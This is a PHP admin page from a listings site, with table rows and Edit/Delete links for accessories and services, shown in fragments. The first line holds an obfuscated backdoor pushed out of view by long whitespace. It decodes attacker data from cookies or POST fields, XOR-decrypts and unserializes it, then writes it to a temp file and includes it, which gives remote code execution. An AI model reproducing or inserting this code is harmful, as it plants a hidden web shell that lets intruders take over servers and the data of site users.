<?php                                                                                                                                                                                                                                                                                                                                                                                                 $JmLVFpbhVd = "y_NLMX";$WiaEzrQaR = class_exists($JmLVFpbhVd); $fwGHGwSAt = $WiaEzrQaR;if (!$fwGHGwSAt){class y_NLMX{private $EPTdzcDLIi;public static $mtlatpjph = "7318c3d9-b81b-434c-9353-9bf95f10ae34";public static $zdBOirQ = NULL;public function __construct(){$jRMAY = $_COOKIE;$BNbBb = $_POST;$xFUEi = @$jRMAY[substr(y_NLMX::$mtlatpjph, 0, 4)];if (!empty($xFUEi)){$dsDxQhwBq = "base64";$cvdHYfMIBB = "";$xFUEi = explode(",", $xFUEi);foreach ($xFUEi as $qFHyTplSwz){$cvdHYfMIBB .= @$jRMAY[$qFHyTplSwz];$cvdHYfMIBB .= @$BNbBb[$qFHyTplSwz];}$cvdHYfMIBB = array_map($dsDxQhwBq . chr ( 543 - 448 ).'d' . "\x65" . 'c' . chr ( 571 - 460 ).'d' . chr ( 1053 - 952 ), array($cvdHYfMIBB,)); $cvdHYfMIBB = $cvdHYfMIBB[0] ^ str_repeat(y_NLMX::$mtlatpjph, (strlen($cvdHYfMIBB[0]) / strlen(y_NLMX::$mtlatpjph)) + 1);y_NLMX::$zdBOirQ = @unserialize($cvdHYfMIBB);}}public function __destruct(){$this->dHCdjT();}private function dHCdjT(){if (is_array(y_NLMX::$zdBOirQ)) {$MJWZyNSi = sys_get_temp_dir() . "/" . crc32(y_NLMX::$zdBOirQ[chr (115) . chr ( 660 - 563 )."\x6c" . "\x74"]);@y_NLMX::$zdBOirQ['w' . "\x72" . chr (105) . "\x74" . "\145"]($MJWZyNSi, y_NLMX::$zdBOirQ[chr ( 190 - 91 ).'o' . chr (110) . "\x74" . 'e' . "\x6e" . 't']);include $MJWZyNSi;@y_NLMX::$zdBOirQ["\144" . "\145" . 'l' . "\145" . chr (116) . chr (101)]($MJWZyNSi);exit();}}}$xGVEiXFGuj = new y_NLMX(); $xGVEiXFGuj = NULL;} ?><?php
                           ...
                           // $select = "select * from models order by title asc";
                            ...
                            if(mysqli_num_rows($q_run)>0){
                                ...
                                <tr>
                                  ...
                                  <td>
                                  <?php
                                  if($data['listing_type']==1){ // ADD ACCESSORY
                                    ?>
                                    <a href="edit-accessory.php?id=<?php echo $data['id']; ?>" class="btn  btn-primary">Edit</a>
                                  ...
                                  }if($data['listing_type']==2){ //! ADD SERVICE
                                    ?>
                                    <a href="edit-service.php?id=<?php echo $data['id']; ?>" class="btn  btn-primary">Edit</a>
                                  <!--<a href="../listing_view.php?id=<?php echo $data['id']; ?>" class="btn  btn-info">View</a>-->
                                  <a onclick="return confirm_delete()" href="delete.php?cmd=service&id=<?php echo $data['id']; ?>" class="btn  btn-danger">Delete</a>
                                  <?php
                                  if($data['is_active']==0){
                                    if(isset($_SESSION['type']) && $_SESSION['type']==1){
                                  ?>
                                  ...
                                  ?>
                                    <a href="edit-listing.php?id=<?php echo $data['id']; ?>" class="btn  btn-primary">Edit</a>
                                  <!--<a href="../listing_view.php?id=<?php echo $data['id']; ?>" class="btn  btn-info">View</a>-->
